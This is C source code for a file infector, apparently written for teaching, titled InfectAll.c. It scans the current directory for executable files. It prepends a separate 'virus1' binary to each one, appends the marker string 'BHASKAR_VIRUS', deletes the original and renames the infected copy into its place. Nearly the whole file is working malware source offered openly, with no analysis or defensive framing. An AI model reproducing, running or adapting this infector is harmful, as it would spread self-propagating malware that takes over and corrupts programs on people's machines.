/*
 * InfectAll.c
 * 
 * Copyright BHASKARJYOTI DAS
 * This program can infect all executable programs in a director on a Linux machine
 * It needs virus program "virus1"
 */

#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>

// #define DEBUG 

int InfectFile(char *, char *);

int checkaccess(char *fname);

unsigned long fileLen,fileLenV, fileLenT;
unsigned long counter;
int number, hnumber;
char c[100] ="BHASKAR_VIRUS";
	
	 
int main(void)
{
    DIR *d; // represents a directory steam
    struct dirent *dir; // This is the structure
    d = opendir(".");
    number=hnumber=0;
    
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            fileLen=0;
            fileLenV =0;
            //printf("file is : %s\n", dir->d_name);
            if (checkaccess(dir->d_name) == 1)
				{
				//First check that not infecting and the virus program 
				if ((strcmp(dir->d_name,"virus1") != 0) && (strcmp(dir->d_name,"infectAll") !=0)&&(strcmp(dir->d_name,".") !=0)&&(strcmp(dir->d_name,"..") !=0))
					{
				
					//printf("Virus at work...\n");
					int r=InfectFile(dir->d_name,"virus1");
					if (r==1)
						{
						number++;
						printf("No of infected file=%d \n",number);
						}
					} // if not the virus program and this executable
				else 
						{
							hnumber++;
							#ifdef DEBUG 
							printf("It is either of virus1 or infectAll=%s \n",dir->d_name);
							#endif
						} 
				}// if it is an executable
        } //while
        closedir(d);
    } // if (d)
    return(0);
}


int checkaccess(char *fname) 
{
  char* path = fname; 
  int rval; 
 
  
 /* Check execute access.  */ 
  rval = access (path, X_OK); 
  if (rval == 0) 
		{
		#ifdef DEBUG 	
    	printf ("%s is executable....\n", path);
    	#endif  
		return 1;
	}
  else 
	return 0;
     
} 



int InfectFile(char *fname1, char *fname2)
{
	
	//Copy the original file  into a new file with signature + virus file preceding it 
	//fname1 is the original file and fname2 is the virus file 
	   
    FILE * fptr1 = fopen(fname1, "rb");  // open existing file
    FILE * fptr2 = fopen(fname2, "rb");  // open virus file
    FILE * fptr3 = fopen("temp", "wb"); // open a new binary file
 
	fseek(fptr3, 0, SEEK_END); //end 
    fileLenT=ftell(fptr3);      // get the exact size
    fseek(fptr3, 0, SEEK_SET); // set at the beginning
    
    //printf("Size of temp file =%lu \n",fileLenT);
 
 													
    fseek(fptr2, 0, SEEK_END); //end 
    fileLenV=ftell(fptr2);      // get the exact size of virus file
    fseek(fptr2, 0, SEEK_SET); // set at the beginning
    
    //printf("Size of Virus file =%lu \n",fileLenV);
    
    fseek(fptr1, 0, SEEK_END); //end 
    fileLen=ftell(fptr1);      // get the exact size of file to be infected
    fseek(fptr1, 0, SEEK_SET); // set at beginning
	
	//printf("Size of  file to be infected =%lu \n",fileLen);
	
	//printf("New file size should be = %lu \n", ((unsigned long)strlen("Signature")+fileLen+fileLenV));
	
      // add the Virus file
    
    for(counter=0; counter<fileLenV; counter++)
        fputc(fgetc(fptr2),fptr3);  // read each byte make a new file from it
    
    // then add the actual file 
    
    for(counter=0; counter<fileLen; counter++)
        fputc(fgetc(fptr1),fptr3);  // read each byte make a new file from it

    //Last  write the signature or marker 
    fprintf(fptr3,"%s",c);
  
	//close files

    fclose(fptr1);
    fclose(fptr2);
    fclose(fptr3);
      
    //delete the original file 
    remove(fname1);
    
    //printf("File %s  deleted.\n", fname1);
	
	//rename the new infected file as old file
	rename("temp", fname1 );
	
    //printf("%s has been rename %s.\n", "temp", fname1);
		
	chmod(fname1,S_IRWXU);
    return 1;
}

